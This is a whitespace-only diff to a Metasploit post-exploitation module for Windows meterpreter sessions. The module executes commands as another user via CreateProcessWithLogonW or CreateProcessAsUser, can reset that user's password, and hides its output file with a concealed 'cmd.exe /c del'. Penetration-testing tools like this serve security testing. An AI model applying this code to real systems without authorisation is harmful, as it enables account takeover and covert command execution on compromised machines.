@@ -27,13 +27,14 @@ class Metasploit3 < Msf::Post
 				CMDOUT to false output will be redirected to a temp file and read back in to
 				display.By setting advanced option SETPASS to true, it will reset the users
 				password and then execute the command.
-				},
+			},
 			'License'              => MSF_LICENSE,
 			'Version'              => '$Revision$',
 			'Platform'             => ['windows'],
 			'SessionTypes'         => ['meterpreter'],
 			'Author'               => ['Kx499']
 		))
+
 		register_options(
 			[
 				OptString.new('USER', [true, 'Username to reset/login with' ]),
@@ -86,7 +87,7 @@ class Metasploit3 < Msf::Post
 			return false
 		end
 	end
-	
+
 	def run
 		# set some instance vars
 		@IsAdmin = false
@@ -132,7 +133,7 @@ class Metasploit3 < Msf::Post
 		# Check privs and execute the correct commands
 		# if local admin use createprocesswithlogon, if system logonuser and createprocessasuser
 		# execute command and get output with a poor mans pipe
-			
+
 		if priv_check
 			if @isadmin #local admin
 				print_status("Executing CreateProcessWithLogonW...we are Admin")
@@ -165,7 +166,7 @@ class Metasploit3 < Msf::Post
 				c = session.sys.process.execute("cmd.exe /c del #{outpath}", nil, {'Hidden' => true})
 				c.close
 			end
-			
+
 			pi = cs["lpProcessInformation"].unpack("LLLL")
 			print_status("Command Run: #{cmdstr}")
 			print_status("Process Handle: #{pi[0]}")
